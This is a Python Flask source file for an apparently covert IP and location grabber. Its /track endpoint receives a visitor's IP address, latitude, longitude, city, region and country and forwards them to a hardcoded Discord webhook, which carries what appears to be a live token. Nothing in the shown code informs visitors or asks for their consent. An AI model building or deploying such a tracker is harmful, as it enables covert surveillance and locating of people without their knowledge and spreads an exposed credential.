from flask import Flask, request, jsonify, send_from_directory
import webbrowser
import threading
import requests

app = Flask(__name__)

# Discord Webhook URL (replace with your own)
DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1317069193924972595/Io7Un7GCwEoig2a0V3IoAN3Ef7sp1uUp1b6HfL6YsgJuCAuhK5jcdb-HUD_W39W9oLW_'

# Function to send message to Discord
def send_to_discord(message):
    payload = {
        "content": message  # The message you want to send
    }
    headers = {
        "Content-Type": "application/json"
    }
    response = requests.post(DISCORD_WEBHOOK_URL, json=payload, headers=headers)
    if response.status_code == 204:
        print("Message sent to Discord successfully.")
    else:
        print(f"Failed to send message to Discord. Status code: {response.status_code}")

@app.route('/')
def index():
    # Serve the HTML file
    return send_from_directory('.', 'index.html')

@app.route('/track', methods=['POST'])
def track_user():
    # Get data from the request
    data = request.json
    ip_address = data.get('ip')
    latitude = data.get('latitude')
    longitude = data.get('longitude')
    city = data.get('city')
    region = data.get('region')
    country = data.get('country')

    # Log the received data (optional)
    print(f"IP Address: {ip_address}")
    print(f"Location: Latitude={latitude}, Longitude={longitude}")

    # Prepare the message to send to Discord
    message = f"""
    **IP Address:** {ip_address}
    **City:** {city}
    **Region:** {region}
    **Country:** {country}
    **Latitude:** {latitude}
    **Longitude:** {longitude}
    """

    # Send the data to Discord
    send_to_discord(message)

    # Respond to the client
    return jsonify({'status': 'success', 'message': 'Data received successfully'})

def open_browser():
    # Automatically open the browser
    webbrowser.open_new('http://127.0.0.1:5000/')

if __name__ == '__main__':
    # Open the default browser automatically after 1 second
    threading.Timer(1, open_browser).start()

    # Start the Flask app
    app.run(debug=True)
